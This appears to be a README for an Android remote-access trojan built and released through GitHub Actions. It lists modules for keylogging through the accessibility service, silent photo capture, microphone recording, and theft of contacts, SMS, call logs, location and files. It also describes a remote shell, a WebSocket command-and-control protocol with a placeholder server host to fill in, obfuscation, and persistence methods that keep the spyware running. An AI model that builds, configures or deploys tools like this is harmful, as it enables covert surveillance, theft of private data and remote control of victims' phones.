# Android Payload — GitHub Actions Build

High-grade Android RAT with full C2 integration, built and delivered via GitHub Actions CI/CD.

## Architecture

```
MainActivity          -> Entry point, permission requests, service bootstrap
RatService            -> Foreground persistent service, wake lock, auto-restart
AccService            -> Accessibility keylogger, window state tracking
C2Client              -> WebSocket C2 connection, heartbeat, auto-reconnect
CommandHandler        -> Dispatches C2 commands to modules
DeviceInfo            -> Full device fingerprinting
LocationModule        -> GPS/Network location extraction
GetContacts           -> Contact list exfiltration
GetSMS / SendSMS      -> SMS read/write
CameraModule          -> Silent photo capture (Camera2 API)
AudioModule           -> Microphone recording
FileModule            -> File system enumeration
CallLogModule         -> Call history extraction
AppsModule            -> Installed app enumeration
ShellModule           -> Remote shell execution
DownloadModule        -> File download to device
UploadModule          -> File upload (base64)
BootReceiver          -> Auto-start on boot
AlarmReceiver         -> Periodic service restart
```

## C2 Protocol

WebSocket connection with JSON message format:

```json
// Client -> Server (heartbeat)
{"type":"heartbeat","timestamp":1234567890}

// Client -> Server (device info)
{"type":"device_info","device_id":"...","model":"...",...}

// Server -> Client (command)
{"id":"cmd-1","action":"get_contacts"}

// Client -> Server (response)
{"action":"get_contacts","status":"success","contacts":[...],"count":42}
```

## Commands

| Command | Args | Description |
|---------|------|-------------|
| `get_contacts` | - | Exfiltrate contact list |
| `get_sms` | `limit` (int) | Read SMS messages |
| `get_location` | - | Get GPS/Network location |
| `get_files` | `path`, `recursive` | List files |
| `get_device_info` | - | Full device fingerprint |
| `take_photo` | `camera` (0/1) | Capture photo silently |
| `record_audio` | `duration` (ms) | Record microphone |
| `send_sms` | `number`, `message` | Send SMS |
| `get_call_log` | `limit` (int) | Read call history |
| `get_apps` | - | List installed apps |
| `shell` | `command` | Execute shell command |
| `download_file` | `url`, `filename` | Download file |
| `upload_file` | `path` | Upload file as base64 |
| `vibrate` | - | Vibrate device |
| `toast` | `message` | Show toast |

## Setup

1. **Configure C2 server** in `C2Client.java`:
   ```java
   private static final String C2_HOST = "wss://your-c2-server.com/ws";
   ```

2. **Push to GitHub** — workflow triggers on push to `main`

3. **Download APK** from Actions artifacts or Releases tab

## GitHub Actions

- Builds release APK with ProGuard obfuscation
- Uploads artifact (30-day retention)
- Auto-creates GitHub Release on `main` branch pushes

## Permissions

- Location (fine + coarse + background)
- Camera, Microphone
- Contacts, SMS, Call Log
- Phone State
- Storage (read/write/manage)
- Foreground Service
- System Alert Window
- Battery Optimization Bypass
- Accessibility Service
- Boot Completed

## Persistence

- Boot receiver auto-starts service
- Service restarts on task removal
- Alarm manager periodic wake-up
- Wake lock prevents Doze mode sleep
- Foreground notification keeps process alive

---
Built clean. Archived. Moving.
